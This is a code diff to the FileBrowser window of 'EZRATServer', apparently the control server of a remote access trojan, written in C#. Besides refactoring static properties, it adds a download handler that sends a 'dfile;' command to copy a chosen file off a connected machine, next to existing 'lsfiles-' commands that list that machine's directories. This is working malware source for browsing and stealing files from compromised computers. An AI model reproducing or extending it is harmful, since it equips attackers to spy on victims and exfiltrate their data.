@@ -14,30 +14,29 @@ namespace EZRATServer
     public partial class FileBrowser : Form
     {
 
-        private static int _id;
+        private int _id;
 
-        public static int Id
+        public int Id
         {
             get { return _id; }
             set { _id = value; }
         }
 
-        private static string _path;
+        private string _path;
 
-        public static string Path
+        public string Path
         {
             get { return _path; }
             set { _path = value; }
         }
 
-        private static Server _parent;
+        private Server _parent;
 
-        public static Server Parent
+        public Server BaseWindows
         {
             get { return _parent; }
             set { _parent = value; }
         }
-
 
 
         public enum FileType : int
@@ -50,10 +49,16 @@ namespace EZRATServer
         {
             InitializeComponent();
 
-            Parent = parent;
+            this.BaseWindows = parent;
             this.cmbDrives.SelectedIndexChanged += UpdatePath;
             this.lstFiles.MouseDoubleClick += NewPath;
+            this.downloadMenu.Click += DownloadFile;
             this.picUp.Click += UpPath;
+        }
+
+        private void DownloadFile(object sender,EventArgs e)
+        {
+            this.BaseWindows.SendCommand("dfile;" + this.lstFiles.Items[lstFiles.Items.IndexOf(lstFiles.SelectedItems[0])].Text, this.Id);
         }
 
         private void UpPath(object sender, EventArgs e)
@@ -67,21 +72,21 @@ namespace EZRATServer
         {
             Path = path;
             this.lblPath.Text = Path;
-            Parent.SendCommand("lsfiles-" + Path, Id);
+            BaseWindows.SendCommand("lsfiles-" + Path, Id);
         }
 
         private void NewPath(object sender, EventArgs e)
         {
-            string path = lstFiles.Items[lstFiles.Items.IndexOf(lstFiles.SelectedItems[0])].Text;
+            string path = this.lstFiles.Items[lstFiles.Items.IndexOf(lstFiles.SelectedItems[0])].Text;
             Path += $@"{path}\";
             this.lblPath.Text = Path;
-            Parent.SendCommand("lsfiles-" + Path, Id);
+            BaseWindows.SendCommand("lsfiles-" + Path, Id);
         }
 
         public void UpdatePath(object sender, EventArgs e)
         {
             this.cmbDrives.Invoke(new MethodInvoker(() => Path = this.cmbDrives.Items[this.cmbDrives.SelectedIndex].ToString()));
-            Parent.SendCommand("lsfiles-" + Path, Id);
+            BaseWindows.SendCommand("lsfiles-" + Path, Id);
             this.lblPath.Text = Path;
         }
 
